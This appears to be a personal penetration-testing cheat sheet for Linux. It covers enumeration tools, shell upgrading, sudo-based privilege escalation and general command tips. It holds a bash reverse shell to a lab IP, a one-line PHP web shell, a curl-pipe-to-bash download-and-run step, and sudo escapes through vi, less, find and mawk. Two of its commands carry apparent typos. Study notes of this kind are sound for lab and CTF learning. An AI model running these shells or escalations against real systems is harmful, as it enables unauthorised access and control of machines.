---
description: 'Sorted Linux notes, need to separate to different pages and reorganize'
---

# Linux Notes

## Linux

Website for searching for shells through random programs such as 'vi' "living off the land binaries": [GTFObins](https://gtfobins.github.io/)

### Enumeration

find files user has access to:

```bash
find / -user <username> -ls 2>/dev/null
```

`which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null` - Check if each of these useful programs are installed on the machine \(only shows the ones currently installed\). 

[Linux Privilege Checker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

full linux enumeration:

* [LinEnum.sh](https://github.com/rebootuser/LinEnum) 
* [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

download **and** execute script \(such as LinEnum.sh\) \[from remote host\]: `curl <url or IP>/LinEnum.sh | bash`

Locate exploits:

```bash
searchsploit <name_of_program> 

#to pull exploit code:
searchsploit -x <name/number of exploit>
```

enumerate running processes: `pspy (TODO: find github and link it)`

`ps -U root -u root ux` View all processes started by a certain user \(`root` in this case\)

enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)

Semi-automated enumeration all-in-one \(use this!\): [nmapAutomator](https://github.com/21y4d/nmapAutomator)

Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)

enumerate info about current processes running from: `/proc/self/status`

### Upgrade shells:

```text
1. python -c 'import pty; pty.spawn("/bin/sh")'
2. perl -e 'exec "/bin/sh";'
3. ruby -e 'exec "/bin/sh"'
```

To upgrade to fully interactive shell \(python example\):

```bash
python -c 'import pty;pty.spawn("/bin/bash")'; 
ctrl-z #[to background]
stty raw -echo; 
fg #[to return shell to foreground]
export TERM=xterm
```

php shell: `<?php system($_GET['variable_name']); ?>`

bash reverse shell:

```text
bash -i >& /dev/tct/10.10.14.148/9001 0>&1

#URL encoded: 
bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
```

### Privilege Escalation

[https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

list user's sudo permissions: `sudo -l`

execute any command while in `less`: `!<cmd>`

Privilege Escalation to Root by setting suid on `/bin/less`: `chmod 47555 /bin/less`

Privilege Escalation to Root with `find`: `sudo find /etc -exec sh -i \;`

wildcard injection: \[NEED MORE HERE\]

```bash
mawk 'BEGIN {system("/bin/sh")}'
```

If your user can `sudo` any of these text editors:

```bash
1. [user@localhost]$ sudo vi
2. :shell
3. [root@localhost]#

1. [user@localhost]$ sudo less file.txt
2. !bash
3. [root@localhost]#

1. [user@localhost]$ sudo more long_file.txt
2. !bash
3. [root@localhost]#
Note: for this method to work, the attacker has to read a file that is longer than one page
```

### Remote Code Execution

[https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/](https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/) Run commands on remote system without a shell through SSH with a "Herefile"

```text
ssh server1 << HERE
 command1
 command2
HERE
```

### Misc Linux

Raw memory location so no files on disk: `/dev/shm/`

list all running commands:

```bash
ps -eo command`
#change delimiter to \n instead of <space> (loop by line): 
IFS=$'\n'
#Then loop through each line in output: 
for i in $(ps -eo command); do echo $i; done
```

[https://unix.stackexchange.com/questions/211817/copy-the-contents-of-a-file-into-the-clipboard-without-displaying-its-contents](https://unix.stackexchange.com/questions/211817/copy-the-contents-of-a-file-into-the-clipboard-without-displaying-its-contents) script to copy contents of file directly to clipboard; Save in PATH location then enjoy!

```text
#! /bin/bash
xclip -selection clipboard -i $@
```

'new' netstat: `ss -lnp | grep 9001` \#check if any connections on port 9001

copy files to local machine without file transfer:

```bash
base64 -w 0 /path/of/file/name.file 
#copy base64 then: 
echo -n <base64material> | base64 -d > filename.file
```

pretty print JSON text in console \([https://www.howtogeek.com/529219/how-to-parse-json-files-on-the-linux-command-line-with-jq/](https://www.howtogeek.com/529219/how-to-parse-json-files-on-the-linux-command-line-with-jq/)\). Pipe the JSON output to `jq`. Example from NASA ISS API: `curl -s http://api.open-notify.org/iss-now.json | jq`

### Check encoding of a text file

`vi -c 'let $enc = &fileencoding | execute "!echo Encoding: $enc" | q' <file_to_check>` check encoding of a text file \(needed especially when doing crypto with python, or cracking passwords with `rockyou.txt` - _hint: needs latin encoding!_\) [https://vim.fandom.com/wiki/Bash\_file\_encoding\_alias](https://vim.fandom.com/wiki/Bash_file_encoding_alias) \(how to make an alias for the above command\)

